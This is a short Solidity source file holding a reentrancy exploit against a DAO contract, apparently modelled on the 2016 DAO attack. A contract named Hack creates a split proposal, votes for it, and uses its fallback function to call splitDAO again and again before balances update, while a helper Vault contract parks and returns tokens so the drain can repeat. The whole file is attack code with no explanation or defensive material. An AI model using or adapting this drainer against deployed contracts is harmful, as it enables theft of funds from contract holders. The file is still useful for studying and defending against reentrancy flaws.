import "DAOInterface.sol";

contract Vault {
  DAOInterface DAO;
  address owner;

  function Vault(address _dao) {
    owner = msg.sender;
    DAO = DAOInterface(_dao);
  }

  function empty() {
    if (msg.sender != owner) return;

    uint balance = DAO.balanceOf(this);
    DAO.transfer(owner, balance);
  }
}

contract Hack {
  uint public proposalID;
  DAOInterface public DAO;
  uint public calls_to_make;
  uint public calls;
  Vault public vault;

  function Hack(address _dao) {
    DAO = DAOInterface(_dao);
    calls = 0;
    vault = new Vault(_dao);
    calls_to_make = 1;
  }

  function makeSplitProposal() {
    // 0x4c6f6e656c792c20736f204c6f6e656c79 == "Lonely, so Lonely"
    // 0x93a80 == 604800 == 1 week in seconds
    bytes memory transactionData;
    proposalID = DAO.newProposal(this, 0x0, "Lonely, so Lonely", transactionData, 0x93a80, true);
  }

  function voteYesOnProposal() {
    DAO.vote(proposalID, true);
  }

  function fillVault() {
    uint balance = DAO.balanceOf(this);
    DAO.transfer(address(vault), balance);
  }

  function splitDAO() {
    calls += 1;
    DAO.splitDAO(proposalID, this);
  }

  function runHack(uint _calls_to_make) {
    calls = 0;
    calls_to_make = _calls_to_make;
    vault.empty();
    splitDAO();
  }

  function() {
    if (calls < calls_to_make) {
      splitDAO();
    } else {
      fillVault();
    }
  }
}
